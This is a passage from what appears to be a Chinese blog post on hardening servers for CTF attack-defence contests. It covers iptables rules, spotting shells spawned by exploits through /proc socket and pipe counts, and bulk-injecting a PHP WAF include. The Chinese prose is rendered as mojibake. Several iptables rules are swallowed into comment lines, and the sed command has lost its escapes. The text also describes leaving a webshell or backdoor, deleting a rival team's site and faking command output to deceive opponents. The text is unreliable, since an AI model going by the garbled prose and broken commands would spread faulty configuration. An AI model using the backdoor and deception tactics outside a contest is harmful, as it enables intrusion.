--icmp-type 8 -s 0/0 -j ACCEPT</span><br><span class="line"><span class="comment">#Close all INPUT FORWARD OUTPUT, just open some ports</span></span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -P FORWARD DROP</span><br><span class="line">iptables -P OUTPUT DROP</span><br><span class="line"><span class="comment">#Open sshiptables -A INPUT -p tcp --dport 22 -j ACCEPT</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#Open port 80iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#Open multiport</span></span><br><span class="line"><span class="comment">#iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span></span><br><span class="line"><span class="comment">#Control IP connection</span></span><br><span class="line"><span class="comment">#The maximum number of connections for a single IP is 30iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span></span><br><span class="line"><span class="comment">#A single IP allows up to 15 new connections in 60 seconds</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#Prevent port reuse</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"><span class="comment">#Filter abnormal packets</span></span><br><span class="line">iptables -A INPUT -i eth1 -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP </span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP </span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP</span><br><span class="line"><span class="comment">#Prevent DoS attacks</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --limit-burst 100 -j ACCEPT</span><br><span class="line"><span class="comment">#Discard unfamiliar TCP response packs to prevent rebound attacks</span></span><br><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>æ³¨æ„ï¼Œå¯¹äºä¸åŒçš„iptablesç‰ˆæœ¬ï¼Œä¸€äº›å‚æ•°çš„ç”¨æ³•å¯ä»¥ä¼šæœ‰ç•¥å¾®çš„å·®å¼‚ï¼Œä½¿ç”¨æ—¶æˆ‘ä»¬å¯èƒ½è¦æ ¹æ®éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚</p><p><strong>5. ç»¼åˆåˆ†ææ§é˜»æº¢å‡ºç±»æ”»å‡»</strong></p><p>å…³äºæº¢å‡ºç±»æ”»å‡»ï¼Œæˆ‘è¿˜æ²¡æœ‰æ€»ç»“å‡ºä¸€äº›å¾ˆå®ç”¨çš„å§¿åŠ¿ï¼Œè¿™é‡Œæä¾›ä¸€äº›æ€è·¯ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæº¢å‡ºæ”»å‡»æˆåŠŸåï¼Œä¼šå»ºç«‹shellé€šé“å’Œç½‘ç»œè¿æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é…åˆå‰é¢æåˆ°çš„å‘½ä»¤ï¼Œä»è¿™ä¸¤æ–¹é¢å…¥æ‰‹è¿›è¡Œæ£€æµ‹å’Œé˜»éš”ï¼š</p><p>ï¼ˆ1ï¼‰æ£€æµ‹é«˜æƒé™çš„è¿›ç¨‹</p><p>ï¼ˆ2ï¼‰æ£€æµ‹shï¼Œbashç­‰è¿›ç¨‹</p><p>ï¼ˆ3ï¼‰æ£€æµ‹å»ºç«‹çš„ç½‘ç»œè¿æ¥</p><p>ï¼ˆ4ï¼‰æ£€æŸ¥å¼€æ”¾çš„ç«¯å£</p><p>ä¾‹å­ï¼šé€šè¿‡ç«¯å£å’Œbashå‘ç°å¯ç–‘è¿›ç¨‹</p><p>å¦‚æœæˆ‘ä»¬æ€€ç–‘æŸä¸ªè¿›ç¨‹æ­£åœ¨æ˜¯å—åˆ°æº¢å‡ºæ”»å‡»ååˆ›å»ºçš„shellè¿›ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†æè¿™ä¸ªè¿›ç¨‹æ˜¯å¦æœ‰socketè¿æ¥ï¼Œlinuxä¸­æŸ¥çœ‹æŒ‡å®šè¿›ç¨‹socketè¿æ¥æ•°çš„å‘½ä»¤ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/&lt;è¿›ç¨‹pid&gt;/fd -l | grep socket: | wc -l </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>æ¯”å¦‚æˆ‘ä»¬æŸ¥çœ‹sshè¿›ç¨‹çš„socketè¿æ¥ã€‚å¦‚æœæˆ‘ä»¬æ£€æµ‹çš„ç¨‹åºæœ‰socketè¿æ¥ï¼Œè¯´æ˜å®ƒæ­£åœ¨è¿›è¡Œç½‘ç»œé€šä¿¡ï¼Œæˆ‘ä»¬å°±éœ€è¦è¿›è¡Œè¿›ä¸€æ­¥åˆ¤æ–­ã€‚</p><p>æˆ‘ä»¬è¿˜å¯ä»¥æ£€æµ‹å¯ç–‘è¿›ç¨‹å¼€å¯çš„ç®¡é“ã€‚linuxä¸‹æŸ¥çœ‹è¿›ç¨‹ç®¡é“æ•°çš„å‘½ä»¤ç±»ä¼¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/&lt;è¿›ç¨‹pid&gt;/fd -l | grep pipe: | wc -l </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>å…¸å‹çš„ä¸€ä¸ªä¾‹å­æ˜¯ï¼šApacheæ¨¡å—åé—¨mod_rootmeï¼Œå®ƒå¤ç”¨äº†webserverçš„80ç«¯å£ï¼Œmod_rootmeé€šè¿‡ç®¡é“å’Œbashäº¤äº’æ•°æ®ï¼Œä½†æ˜¯ç”±äºå¼€å¯äº†é¢å¤–çš„ç®¡é“ï¼Œæˆ‘ä»¬ä»è¿™ä¸ªå˜åŒ–ä¸Šä¾¿èƒ½å¯Ÿè§‰åˆ°ã€‚</p><p>è¯¦ç»†å†…å®¹å¯ä»¥å‚è€ƒï¼š <a href="http://t.qq.com/p/t/330573116082464%E3%80%82">http://t.qq.com/p/t/330573116082464ã€‚</a></p><p>æ€»ä½“æ¥è¯´ï¼Œæˆ‘ä»¬ä¸»è¦å¯ä»¥å…³æ³¨è¿›ç¨‹æƒ…å†µå’Œç½‘ç»œè¿æ¥æƒ…å†µï¼Œç»¼åˆåˆ†æè¿›ç¨‹ï¼Œé˜»æ–­æº¢å‡ºæ”»å‡»åˆ›å»ºçš„shelçš„ã€‚</p><p><strong>6. æ¼æ´ä¿®å¤ç®€å•ç²—æš´</strong></p><p>CTFæ¯”èµ›ä¸­ä¿®å¤æ¼æ´ä¸»è¦å°±æ˜¯ä¸ºäº†é˜²æ­¢å…¶ä»–é˜Ÿä¼çš„å…¥ä¾µäº†ã€‚</p><p><strong>1. åˆ ç«™</strong>ï¼šå¦‚æœèµ›ç»„æ²¡æœ‰æ˜ç¡®ç¦æ­¢ï¼Œè¿™æ˜¯æœ€ç²—æš´çš„å§¿åŠ¿ï¼Œåªç•™è‡ªå·±çš„webshellï¼Œå‚åŠ è¿‡å‡ åœºæ¯”èµ›ç¡®å®é‡åˆ°äº†è¿™ç§å°´å°¬çš„äº‹æƒ…ï¼Œwebæ”»é˜²æœ€åéƒ½æ¼”å˜æˆäº†æ‹¼æ‰‹é€Ÿçš„â€œGetShell+ç•™åé—¨+åˆ ç«™â€ã€‚</p><p><strong>2. åˆ æ¼æ´é¡µé¢</strong>ï¼šå¤§éƒ¨åˆ†ä¸¾åŠæ–¹è¿˜æ˜¯ä¼šæ˜ç¡®ç¦æ­¢åˆ é™¤ç½‘ç«™çš„ï¼Œé€šå¸¸èµ›ç»„ä¼šå®šæœŸè®¿é—®ç½‘ç«™ä¸»é¡µï¼ˆä¸€èˆ¬æ¥è¯´ï¼‰ï¼Œä»è€Œç¡®å®šç½‘ç«™æ˜¯å¦æ­£å¸¸è¿è¡Œã€‚å…¶å®æˆ‘ä»¬æ²¡å¿…è¦åˆ é™¤æ•´ä¸ªç½‘ç«™ï¼Œåªè¦åˆ æ‰æœ‰æ¼æ´çš„é¡µé¢å°±è¡Œäº†ï¼Œæ¯”å¦‚åˆ åå°ç™»å½•é¡µé¢ã€æ³¨å†Œé¡µé¢ã€ä¸Šä¼ é¡µé¢ç­‰ç­‰ã€‚</p><p><strong>3. ç ´åæ­£å¸¸åŠŸèƒ½</strong>ï¼šå¦‚æœæ˜ç¡®ä¸èƒ½åˆ é™¤ä»»ä½•é¡µé¢ï¼Œå¯ä»¥é€‰æ‹©è®©è¿™äº›æ¼æ´ç‚¹çš„åŠŸèƒ½å‡½æ•°ï¼ˆæˆ–è€…å…¶ä¾èµ–çš„åŠŸèƒ½å‡½æ•°ï¼‰å¤±æ•ˆã€‚æ¯”å¦‚ä¸Šä¼ ç‚¹ï¼Œå¦‚æœè€ƒè™‘è¿‡æ»¤æŒºéº»çƒ¦ï¼Œåˆä¸èƒ½åˆ é¡µé¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¿™ä¸ªæ¼æ´ç½‘é¡µï¼Œæ”¹æ‰æˆ–è€…åˆ æ‰æ–‡ä»¶é‡Œå¯¹åº”çš„ç±»ä¼¼uploadç­‰è¿™ç§åŠŸèƒ½è°ƒç”¨å‡½æ•°ã€‚</p><p>ä¸Šé¢è¿™ä¸‰ç§å…¶å®éƒ½ç®—ä¸ä¸Šä¿®è¡¥æ¼æ´äº†ï¼ŒçœŸå®ç¯å¢ƒä¸‹å“ªèƒ½è¿™ä¹ˆå¹²ã€‚</p><p><strong>4. é‡‡ç”¨æ­£å¸¸ä¿®è¡¥æ‰‹æ®µ</strong>ï¼šè§„åˆ™é™å®šå¾ˆä¸¥çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯é‡‡ç”¨æ­£å¸¸æ‰‹æ³•å§ï¼Œä¿®æ”¹æœåŠ¡é…ç½®ã€å®‰è£…è¡¥ä¸ã€ä¸‹è½½æ›´æ–°çš„è½¯ä»¶ç‰ˆæœ¬ã€åŠ è¿‡æ»¤ç­‰ç­‰ã€‚</p><blockquote><p>_&lt;&lt;&lt;&lt;&lt;&lt;</p></blockquote><p>è°ˆåˆ°é‚£ä¸ªåˆ ç«™ï¼Œæˆ‘å¿ä¸ä½æƒ³åæ§½å‡ å¥ï¼Œæˆ‘ä¸ªäººæ˜¯ä¸èµæˆè¿™ç§åšæ³•çš„ï¼Œå› ä¸ºè¿™ç§æ“ä½œåœ¨æ¯”èµ›ä¸­å¾ˆå®¹æ˜“æ‹‰ä»‡æ¨å¹¶ä¸”äº§ç”Ÿè¿é”ååº”ï¼Œä¹Ÿä¸åˆ©äºä¸ªäººçš„è¿›æ­¥ã€‚æœ‰äº›äººè®¤ä¸ºï¼šæˆ‘å…ˆæ‹¿ä¸‹è¿™å°æœåŠ¡å™¨è¯´æ˜æˆ‘æœ‰èƒ½åŠ›ï¼Œä½ æ²¡è¿›å»å°±è¯´æ˜ä½ æ²¡æœ¬äº‹ï¼Œæ‰€ä»¥æˆ‘å…ˆè¿›å»åˆ äº†ç«™ä¸è®©å…¶ä»–äººè¿›ä¹Ÿæ— å¯åšéï¼Œæœ‰èƒ½è€ä½ å°±å…ˆæ‹¿ä¸‹å®ƒï¼Œé‚£ä½ åˆ äº†æˆ‘ä¹Ÿæ²¡æ„è§ã€‚ä¹Ÿæœ‰äººè¯´ï¼ŒçœŸæ­£çš„å¯¹æŠ—é‡Œï¼Œæ•Œäººä¸ä¼šå¯¹ä½ ä»æ…ˆï½ï½æ²¡é”™ï¼ŒæŒºæœ‰é“ç†çš„ï¼Œè€Œä¸”å¼ºè€…ä¹Ÿåº”è¯¥æ‹¥æœ‰å‘è¨€æƒã€‚ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½åªä»ä¸€ä¸ªè§’åº¦è€ƒè™‘é—®é¢˜ï¼Œæ¢ä¸ªè§’åº¦å»è€ƒè™‘ï¼ŒCTFç«èµ›è™½ç„¶æ˜¯å‘ç€çœŸå®çš„ç½‘ç»œç¯å¢ƒé æ‹¢ï¼Œä½†æ˜¯å®ƒçš„æ ¹æœ¬ç›®çš„æ˜¯æé«˜ç«æŠ€è€…çš„å®‰å…¨æŠ€èƒ½å’ŒçŸ¥è¯†æ°´å¹³ã€‚å¯¹äºå¤§éƒ¨åˆ†åˆ‡ç£‹ç«æŠ€çš„ç©å®¶æ¥è¯´ï¼Œå‚åŠ æ¯”èµ›ä¹Ÿéƒ½æ˜¯ä¸ºäº†è®©è‡ªå·±è·å¾—æé«˜ï¼Œå¤§å®¶åœ¨åŒä¸€ä¸ªå¹³å°ä¸Šè¿›è¡Œè¿›è¡Œåˆ‡ç£‹å¯¹æŠ—ï¼Œè®¤è¯†åˆ°è‡ªå·±å’Œå¯¹æ‰‹èº«ä¸Šçš„ä¼˜ç‚¹ä¸ä¸è¶³ï¼Œè¿™æ‰æ˜¯ç«æŠ€ã€‚ä½†æ˜¯è¿™ç§è¡Œä¸ºå…¶å®ä»æŸç§æ„ä¹‰ä¸Šæ¥è¯´å·²ç»ç ´åäº†æ¯”èµ›çš„å…¬å¹³æ€§ï¼Œæ¯•ç«Ÿå¦‚æœæ˜¯å› ä¸ºæŠ€æœ¯ä¸åˆ°ä½ï¼Œé‚£å½“ç„¶æ²¡ä»€ä¹ˆè¯è¯´ï¼Œä½†æ˜¯å¦‚æœç½‘ç«™åˆ äº†ï¼Œè®©åˆ«äººå‘æŒ¥çš„åœ°æ–¹éƒ½æ²¡æœ‰ï¼Œè¿™ç§åˆ‡ç£‹ä¹Ÿæ²¡æœ‰æ„ä¹‰ã€‚ä¸¾ä¸ªä¸å¤ªæ°å½“çš„ä¾‹å­ï¼Œè¿™å°±åƒä¸¤ä¸ªäººæ‰“æ¶ï¼Œä½ è¯´ä½ æ¯”æˆ‘å¼ºï¼Œå’±ä»¬æ¯”æ¯”å†è¯´ï¼Œä½†æ˜¯ä½ éƒ½ä¸è®©æˆ‘è·Ÿä½ æ‰“ï¼Œè¿™ç®—ä»€ä¹ˆã€‚å†æ¢ä¸ªè§’åº¦ï¼Œå…¶å®æˆ‘ä¸€ç›´åšä¿¡çœŸæ­£å…·æœ‰å¼ºè€…å§¿æ€çš„äººï¼Œä¸ç•æƒ§æŒ‘æˆ˜ã€ä¸æ€•è¢«äººè¶…è¶Šï¼Œä¸å±‘äºé€šè¿‡è¿™ç§æ‰‹æ®µå·©å›ºè‡ªå·±çš„åœ°ä½ã€‚ç›¸åï¼Œæˆ‘ä»¬åªæœ‰å°†è‡ªå·±è‡³äºç‹‚é£å¤§æµªä¸­ï¼Œæ‰èƒ½æˆé•¿å’Œèœ•å˜ï¼Œæœ€ç»ˆæˆä¸ºä¸€ä¸ªå¼ºè€…ã€‚</p><p>æ— è®ºä»ä»€ä¹ˆè§’åº¦è€ƒè™‘ï¼Œæˆ‘ä»¬åº”è¯¥æ•¢äºæŒ‘æˆ˜è‡ªèº«ã€æŒ‘æˆ˜åˆ«äººï¼Œä¸æ–­å¼ºå¤§è‡ªå·±ï¼Œä¸æ–­å»å¾æœï¼Œæ— ç•æ— æƒ§ã€æ­¥å±¥é“¿é”µï¼</p><p><strong>7. å®‰å…¨è½¯ä»¶é”¦ä¸Šæ·»èŠ±</strong></p><p>å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹è½¯ä»¶çš„è¯ï¼Œè£…ä¸ªWAFï¼Œå®‰å…¨ç‹—ä¹‹ç±»çš„å§ã€‚è¿™ä¸ªæˆ‘æ²¡ä»€ä¹ˆè¯è¦è¯´ï¼Œé™„ä¸ªlinuxå®‰å…¨ç‹—çš„é“¾æ¥å§ï¼š</p><p>å®‰å…¨ç‹—linuxç‰ˆï¼š<a href="http://www.safedog.cn/website_safedog.html">http://www.safedog.cn/website_safedog.html</a></p><p>æˆ‘ä»¬å¹³æ—¶ä¹Ÿå¯ä»¥æœé›†æˆ–è€…è‡ªå·±å®ç°ä¸€äº›è„šæœ¬æˆ–è€…å·¥å…·å¤‡ç”¨ã€‚</p><p>è¿™é‡Œæœ‰wafä¸€æšï¼š<a href="http://hackblog.cn/post/75.html">http://hackblog.cn/post/75.html</a></p><p>å¦‚æœæˆ‘ä»¬æƒ³ç»™webç›®å½•æ–‡ä»¶æ·»åŠ è‡ªå®šä¹‰wafè„šæœ¬ï¼Œå…¶å®å¯ä»¥ç”¨ä¸€æ¡å‘½ä»¤è§£å†³,ä»¥phpä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?phpnrequire_once(&#x27;/tmp/waf.php&#x27;);n/g&quot; </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>å‘½ä»¤çš„æ„æ€å°±æ˜¯æŸ¥æ‰¾&#x2F;var&#x2F;www&#x2F;htmlç›®å½•ä¸‹æ‰€æœ‰phpæ–‡ä»¶ï¼Œåœ¨å¤´éƒ¨æ·»åŠ ä¸€å¥ï¼Œç”¨requireå‡½æ•°å¼•å…¥&#x2F;tmp&#x2F;waf.phpæ–‡ä»¶ã€‚å› ä¸ºsedå‘½ä»¤åˆ©ç”¨ &#x2F; åŒºåˆ†æ–‡ä»¶ä¸­çš„åŸå­—ç¬¦ä¸²å’Œä¿®æ”¹çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¯¹ &#x2F; è¿›è¡Œè½¬ä¹‰ã€‚ç±»ä¼¼äºåœ¨å•å¼•å·ä¸­å†æ¬¡ä½¿ç”¨å•å¼•å·æ—¶æˆ‘ä»¬ä¹Ÿè¦ç”¨åæ–œæ è½¬ä¹‰ï¼šâ€™ï¼Œå‘½ä»¤è½¬æ¢è¿‡æ¥å°±æ˜¯è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?phpnrequire_once(&#x27;/tmp/waf.php&#x27;);n/g&quot; </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>è¿™æ ·ï¼Œå†æ¬¡æ‰“å¼€æ—¶æˆ‘ä»¬å°±ä¼šå‘ç°å·²ç»å¼•å…¥äº†è‡ªå®šä¹‰wafæ–‡ä»¶ã€‚</p><p><strong>8. æˆ‘å¯èƒ½getäº†å‡çš„flag</strong></p><p>å¦‚æœè¯´å¾ˆä¸å¹¸ï¼Œæˆ‘ä»¬å‰é¢çš„å…³å¡éƒ½è¢«çªç ´äº†ï¼ˆå®é™…ä¸Šæˆ‘éƒ½æ„Ÿè§‰å‰é¢é‚£äº›è®¾ç½®éƒ½æœ‰ç‚¹â€œæ…å±â€çš„å‘³é“äº†ï¼Œä¸è¿‡è¿˜æ˜¯å¸Œæœ›å¸ˆå‚…ä»¬èƒ½ä¸€èµ·æ¥è®¨è®ºè®¨è®ºæœ‰æ²¡æœ‰ä»€ä¹ˆéªšå§¿åŠ¿ï¼Œä»¥åŠç»•è¿‡å®ƒä»¬çš„æ–¹æ³•ï¼‰ã€‚å‡è®¾çœŸçš„è¢«çªç ´äº†ï¼Œå¯¹äºCTFçº¿ä¸‹èµ›æ¥è¯´ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„éƒ½æ˜¯æ‹¿åˆ°flagã€‚é€šå¸¸æˆ‘ä»¬ä¼šåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œç±»ä¼¼äºâ€getflagâ€å‘½ä»¤ï¼Œæˆ–è€…â€curlâ€è®¿é—®æŸä¸ªurlè·å–flagï¼Œç„¶åè·å–åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶ååœ¨ç­”é¢˜å¹³å°ä¸Šæäº¤è¿™æ®µå­—ç¬¦ä¸²å³å¯è·å–åˆ†æ•°ã€‚å°±æ‹¿å‰ä¹‹å‰çš„ISCCæ¥è¯´ï¼Œè¿™ä¸ªä¹Ÿæ˜¯æˆ‘èµ›åæƒ³åˆ°çš„ã€‚è¿™ä¸ªgetflagæ˜¯ä¸€ä¸ªelfçš„ç¨‹åºï¼Œåœ¨&#x2F;usr&#x2F;bin&#x2F;ä¸‹ï¼Œé¡ºæ‰‹ç»™ä¸‹è½½äº†ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥å»é€†å‘ä¸€æ³¢ã€‚é‡ç‚¹åœ¨è¿™ï¼Œæœ‰å‡ æ¬¡æˆ‘getflagçš„æ—¶å€™å› ä¸ºwebshellä¸¢äº†ï¼ŒæœåŠ¡å™¨æ˜¾ç¤ºäº†Errorã€‚åæ¥æƒ³æƒ³ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æ•…æ„åˆ©ç”¨è¿™ç§æŠ¥é”™æ¥æ¬ºéª—ä¸ç»†å¿ƒçš„ç«äº‰å¯¹æ‰‹å‘¢ï¼Œå½“ç„¶æˆ‘ä¸çŸ¥é“æ˜¯ä¸æ˜¯å·²ç»æœ‰å¸ˆå‚…ä»¬ç”¨äº†è¿™ä¸ªæ‰‹æ³•ã€‚è¿™æ˜¯æ¨¡æ‹Ÿçš„æ•ˆæœï¼š</p><p>æ€æ ·å®ç°ï¼Ÿæ¯”å¦‚æˆ‘ä»¬å¯ä»¥æ·»åŠ aliasåˆ«åï¼Œæˆ–è€…æˆ‘ä»¬å¯ä»¥æŠŠè¿™äº›å‘½ä»¤æ›´æ”¹æˆ–è€…æ›¿æ¢æ‰ï¼Œæ¢æˆä¸€äº›ä¼ªè£…å‘½ä»¤ç¨‹åºã€‚å†æ¢ä¸€å±‚æƒ³æƒ³ï¼Œæ¥ç€ä¸Šé¢çš„æ€è·¯ï¼Œå¦‚æœæˆ‘ä»¬æ›¿æ¢æˆ–è€…ä¼ªè£…äº†ç³»ç»Ÿå‘½ä»¤ï¼Œå¯¹æ–¹getshellä¹‹åï¼Œè¿›æ¥å‘ç°cdï¼Œlsç­‰å‘½ä»¤éƒ½æ²¡æ³•ç”¨ï¼Œä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿç„¶è€Œè¿™æ ·ä¼šä¸ä¼šä¸å¤ªå¥½ï½ï½</p><p>æœ€åæ¨èä¸€ä¸ªæ„Ÿè§‰æŒºå®ç”¨åŠŸèƒ½å¾ˆå¼ºçš„è¿œç¨‹è¿æ¥ç®¡ç†å·¥å…·ï¼Œå¯ä»¥æå¤§æ–¹ä¾¿æˆ‘ä»¬çš„å·¥ä½œï¼š<a href="https://mobaxterm.mobatek.net/">MobaXterm</a>ã€‚ï¼ˆä¸æ˜¯æ‰“å¹¿å‘Š~ï¼‰</p><p>å®ƒæ”¯æŒå¤šç§è¿æ¥æ–¹å¼ï¼Œå¯ä»¥æ‹–æ‹½è¿›è¡Œæ–‡ä»¶ç®¡ç†ã€‚æ”¯æŒåœ¨æ‰“å¼€çš„ä¼šè¯ä¸€é”®æ‰¹é‡æ‰§è¡Œå‘½ä»¤ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªéå¸¸æ–¹ä¾¿çš„sshç«¯å£è½¬å‘åŠŸèƒ½ï¼Œæ”¯æŒæœ¬åœ°ã€è¿œç¨‹ã€åŠ¨æ€è½¬å‘ã€‚</p><p>è¿˜æœ‰å¾ˆå¤šå…¶ä»–åŠŸèƒ½è²Œä¼¼å¾ˆå‰å®³ï¼Œä¸è¿‡æˆ‘æ²¡ç”¨è¿‡ï¼Œå°±ä¸è¯´äº†â€¦</p><p>çœŸä¸æ˜¯æ‰“å¹¿å‘Šã€‚</p><p><strong>ä¸‰. å¯¹CTFä¸¾åŠçš„ä¸€ç‚¹å°å°å»ºè®®</strong></p><p>å¦‚ä»ŠCTFè¶Šæ¥è¶Šç«ï¼Œå¯¹äºè¿™äº›æ¯”èµ›çš„ä¸¾åŠæ–¹ï¼Œæˆ‘æœ‰ç€ä¸€äº›ä¸æˆç†Ÿæƒ³æ³•å’Œå°å»ºè®®ï¼Œå¦‚æœæ‚¨è§‰å¾—æœ‰ä»€ä¹ˆä¸åˆé€‚çš„åœ°æ–¹ï¼Œçº¯å½“å¨±ä¹ï¼š</p><p>ï¼ˆ1ï¼‰æ‰©å±•ç«æŠ€å½¢å¼ï¼šç›®å‰çº¿ä¸‹èµ›webæ”»é˜²å ç»å¤§å¤šæ•°ï¼Œæœ‰äº›å°æ¯”èµ›ç”šè‡³åªæœ‰è‹¥å¹²webæœåŠ¡å™¨ï¼Œä¸Šé¢æ”¾å‡ ä¸ªä¸åŒç±»å‹çš„ç«™ç‚¹ï¼Œå½¢å¼æœ‰äº›å•ä¸€äº†ï¼Œå…¶å®å¯ä»¥å¢åŠ å¤šç§å¯¹æŠ—æ¨¡å¼ï¼Œç”šè‡³å¯ä»¥è®©å‚èµ›é€‰æ‰‹èµ°å‡ºæ¯”èµ›åœºåœ°ã€‚å»å¹´æ›¾æœ‰å¹¸è†å¬äº†è¯¸è‘›å»ºä¼Ÿåšå£«å…³äºæ‰“ç ´XCTFç°æœ‰æ ¼å±€çš„è®²åº§ï¼Œä»–æå‡ºäº†ä½“ç³»åŒ–æ”»é˜²æ¼”ç»ƒï¼Œè®¤ä¸ºCTFå¯ä»¥å¼•å…¥å®åœ°wifiæ¸—é€ã€é—¨ç¦ç³»ç»Ÿçªç ´ã€æ— äººæœºæ”»é˜²ã€GPSä¿¡å·å¯¹æŠ—ç­‰ï¼Œå¢åŠ æ¯”èµ›å¤šæ ·æ€§ä¸è¶£å‘³æ€§ï¼Œè®©çº¿ä¸‹èµ›ä¸å†åªæ˜¯å±€é™äºå°å°çš„æœºæˆ¿</p><p>ï¼ˆ2ï¼‰é‡è§†å®‰å…¨åˆ†æä¸é˜²æŠ¤ã€‚å®‰å…¨ä¸ä»…ä»…åªæ˜¯ç½‘ç»œæ”»é˜²å¯¹æŠ—ï¼Œæ•°æ®åˆ†æã€å–è¯åˆ†æã€åº”æ€¥å“åº”ã€è¿½è¸ªæº¯æºç­‰æŠ€èƒ½ä¹Ÿç›¸å½“é‡è¦ï¼Œå¹¶ä¸”åœ¨å®‰å…¨äººæ‰åœˆé‡Œè¿™æ–¹é¢ç¼ºå£ä¹Ÿæ¯”è¾ƒå¤§ã€‚ä»Šå¹´å…­æœˆä»½ï¼Œå¯æ˜æ˜Ÿè¾°ä¸»åŠçš„2017â€ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›â€ï¼ˆåˆ†ä¸ºâ€ä¸ªäººé€†å‘èµ›â€œã€â€æ•°æ®åˆ†æèµ›â€œã€â€ä¼ä¸šæ”»é˜²èµ›â€œä¸‰ä¸ªèµ›äº‹ï¼‰ï¼Œå…¶ä¸­â€æ•°æ®åˆ†æèµ›â€œä¾¿æ˜¯ä¸€ä¸ªå…¸å‹ä»£è¡¨ï¼Œå‚èµ›é€‰æ‰‹éœ€è¦åˆ†æçœŸå®ä¼ä¸šç½‘ç»œç¯å¢ƒä¸‹å—ç½‘ç»œæ”»å‡»çš„æµé‡æ•°æ®ï¼Œä»ä¸­æ‰¾å‡ºæ”»å‡»è€…ã€åˆ†æå…¶ç½‘ç»œæ”»å‡»è¡Œä¸ºï¼Œå¦‚æ¬ºéª—åŠ«æŒã€çˆ†ç ´ã€webshellè¿æ¥æ“ä½œç­‰ï¼Œæ‰¾åˆ°å¹¶åˆ†ææ”»å‡»è€…çš„åé—¨æˆ–è€…æ¶æ„è½¯ä»¶ã€‚è¿™ç§æ¨¡å¼ï¼Œæœ‰åŠ©äºå‚èµ›è€…æ¥è§¦åˆ°ç›¸å¯¹æ›´åŠ 